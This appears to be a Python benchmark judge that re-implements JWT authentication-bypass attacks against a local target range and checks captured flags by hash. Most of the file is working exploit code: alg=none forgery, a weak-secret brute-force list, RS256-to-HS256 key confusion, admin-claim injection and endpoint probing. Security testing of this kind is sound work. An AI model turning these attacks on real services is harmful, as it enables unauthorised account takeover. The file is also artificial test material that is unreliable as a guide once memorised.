#!/usr/bin/env python3
"""JWT 认证绕过基准 —— Python 侧独立机验（Go jwt_attack.go 的双语言复刻）。

不复用 Go 任何代码：纯标准库自行实现 JWT 解析/伪造与三类攻击
（alg=none / HS256 弱密钥爆破 / RS256→HS256 公钥混淆），
对 jwt_range.py 靶场实测，命中以 SHA-256 比对（基准集只存哈希，不存明文 flag）。

用法: python judge_jwt.py
"""

import base64
import hashlib
import hmac
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
RANGE_PY = os.path.join(HERE, "live_target", "jwt_range.py")
BENCH = os.path.join(HERE, "jwt_benchmark.json")
PORT = "18088"

TIMEOUT = 8

# 与 Go jwtSecrets 对齐的弱密钥表
SECRETS = [
    "secret", "secret123", "password", "123456", "12345678", "admin", "key",
    "letmein", "changeme", "flag", "jwt", "test", "1234", "qwerty", "superman",
    "mysecret", "myscret", "topsecret", "s3cr3t", "s3cret", "passw0rd", "root",
    "default", "guest", "user", "auth", "token", "sign", "signature", "private",
    "public", "hs256", "hmac", "secretkey", "secret_key", "jwtsecret", "jwt_secret",
    "your-256-bit-secret", "your-secret-key", "super_secret", "master", "trustno1",
    "123456789", "iloveyou", "monkey", "dragon", "baseball", "football", "welcome",
]

RE_JWT = re.compile(r"eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*")
RE_PATH = re.compile(r"/[A-Za-z0-9_./-]{2,80}")
RE_FLAG = re.compile(r"flag\{[^}\x00-\x1f\x7f]{4,}\}|[A-Z][A-Z0-9]{2,15}\{[^}\x00-\x1f\x7f]{4,}\}",
                     re.IGNORECASE)


def b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def b64d(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def hs256(signing_input: str, key: bytes) -> str:
    return b64e(hmac.new(key, signing_input.encode(), hashlib.sha256).digest())


def sh(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()


def fetch(url, data=None, token=None, ctype=None, timeout=TIMEOUT):
    """返回 (status, body_bytes)；异常返回 (0, b'')。"""
    req = urllib.request.Request(url, data=data)
    if token:
        req.add_header("Authorization", "Bearer " + token)
        req.add_header("Cookie", f"token={token}; jwt={token}")
    if data is not None:
        req.add_header("Content-Type", ctype or "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()
        except Exception:
            return e.code, b""
    except Exception:
        return 0, b""


def wait_ready(port, tries=80):
    for _ in range(tries):
        st, _ = fetch(f"http://127.0.0.1:{port}/")
        if st:
            return True
        time.sleep(0.1)
    return False


def parse_endpoints(desc: str):
    """从题目描述里抽端点（与 Go ParseWebHints 等价的简化实现）。"""
    eps = []
    for m in RE_PATH.findall(desc):
        p = m.rstrip(".,;:)")
        if p and p not in eps:
            eps.append(p)
    return eps


def forge(payload_seg: str) -> str:
    """在原 claims 上叠加 admin 提权字段后重新编码。"""
    claims = {}
    if payload_seg:
        try:
            claims = json.loads(b64d(payload_seg))
            if not isinstance(claims, dict):
                claims = {}
        except Exception:
            claims = {}
    claims.update({"role": "admin", "user": "admin", "admin": True,
                   "isAdmin": True, "is_admin": True, "sub": "admin", "username": "admin"})
    return b64e(json.dumps(claims, separators=(",", ":")).encode())


def header_for(alg: str) -> str:
    return b64e(json.dumps({"alg": alg, "typ": "JWT"}, separators=(",", ":")).encode())


def candidates(observed: str, pubkeys):
    """产出全部伪造 token 候选（三类攻击 + 空密钥）。"""
    out = []
    base_payload = forge("")

    # 攻击 1：alg=none
    for alg in ("none", "None", "nOnE"):
        si = header_for(alg) + "." + base_payload
        out += [si + ".", si]

    # 攻击 4：空密钥
    h = header_for("HS256")
    out.append(h + "." + base_payload + "." + hs256(h + "." + base_payload, b""))

    if not observed:
        return dedup(out)
    parts = observed.split(".")
    if len(parts) != 3:
        return dedup(out)
    signing_input, sig, payload = parts[0] + "." + parts[1], parts[2], forge(parts[1])

    # 攻击 2：弱密钥爆破（验证命中才重签）
    for sec in SECRETS:
        if hmac.compare_digest(hs256(signing_input, sec.encode()), sig):
            out.append(h + "." + payload + "." + hs256(h + "." + payload, sec.encode()))
            break

    # 攻击 3：公钥混淆
    for pk in pubkeys:
        for kb in (pk, pk.strip(), pk.strip() + b"\n"):
            if not kb:
                continue
            if hmac.compare_digest(hs256(signing_input, kb), sig):
                out.append(h + "." + payload + "." + hs256(h + "." + payload, kb))
                break
            out.append(h + "." + payload + "." + hs256(h + "." + payload, kb))
    return dedup(out)


def dedup(seq):
    seen, out = set(), []
    for s in seq:
        if s and s not in seen:
            seen.add(s)
            out.append(s)
    return out


def exploit(base: str, desc: str):
    eps = parse_endpoints(desc)
    login_eps = [e for e in eps if any(k in e.lower() for k in ("login", "auth", "token"))]
    key_eps = [e for e in eps if any(k in e.lower() for k in ("pem", "jwks", "public", "key"))]
    flag_eps = [e for e in eps if "login" not in e.lower() and "pem" not in e.lower()]
    flag_eps += ["/api/flag", "/flag", "/admin", "/api/admin"]

    pubkeys = []
    for e in key_eps:
        _, body = fetch(base + e)
        if body:
            pubkeys.append(body)

    observed = ""
    for e in login_eps:
        for form in (b"user=guest&pass=guest", b"user=admin&pass=admin"):
            _, body = fetch(base + e, data=form)
            m = RE_JWT.search(body.decode("utf-8", "replace"))
            if m:
                observed = m.group(0)
                break
        if observed:
            break

    toks = candidates(observed, pubkeys)
    found = []
    for ep in dedup(flag_eps):
        _, body = fetch(base + ep)
        found += RE_FLAG.findall(body.decode("utf-8", "replace"))
        for t in toks:
            _, body = fetch(base + ep, token=t)
            found += RE_FLAG.findall(body.decode("utf-8", "replace"))
    return dedup(found)


def main():
    if not os.path.exists(BENCH) or not os.path.exists(RANGE_PY):
        print("缺少 jwt_benchmark.json 或 jwt_range.py", file=sys.stderr)
        return 1
    doc = json.load(open(BENCH, encoding="utf-8"))["problems"]

    proc = subprocess.Popen([sys.executable, RANGE_PY, PORT],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        if not wait_ready(PORT):
            print("靶场未就绪", file=sys.stderr)
            return 1
        base = f"http://127.0.0.1:{PORT}"
        hit = 0
        for pid in sorted(doc):
            desc = doc[pid]["description"]
            found = exploit(base, desc)
            ok = any(sh(f) == doc[pid]["flag_sha256"] for f in found)
            hit += 1 if ok else 0
            print(f"{pid:<12} {'HIT ' if ok else 'MISS'}  (候选 {len(found)})")
        print(f"JWT 认证绕过基准（Python 侧独立复刻）: {hit}/{len(doc)}")
        return 0 if hit == len(doc) else 1
    finally:
        proc.kill()


if __name__ == "__main__":
    sys.exit(main())
